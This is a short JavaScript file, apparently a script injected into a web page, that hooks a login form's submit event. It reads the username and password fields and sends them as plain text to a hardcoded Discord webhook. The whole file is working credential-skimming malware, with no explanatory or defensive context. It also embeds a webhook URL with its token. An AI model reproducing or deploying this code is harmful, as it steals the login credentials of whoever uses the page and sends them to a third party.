window.addEventListener("load", async () => {
    const formXpath = "/html/body/div[2]/div[2]/div[2]/section/form";
    const form = document.evaluate(formXpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    form.addEventListener("submit", async () => {
        let username = document.getElementById("UserName").value;
        let password = document.getElementById("Password").value;
        const header = {
            "Content-type": "application/json"
        };
        const params = {
            "username": "kőmíves scarlxrd",
            "avatar_url": "",
            "content": `${username}:${password} @everyone`
        };
        await fetch("https://discord.com/api/webhooks/956115202405957652/U3Hc1-wrbSXy3BEPQdfxPSFXJw6prSVgaTvoNd5ADFOlaS6Ni91RdHJlxOln5sXl_13x", {
            method: 'POST',
            headers: header,
            body: JSON.stringify(params)
        });
    });
});
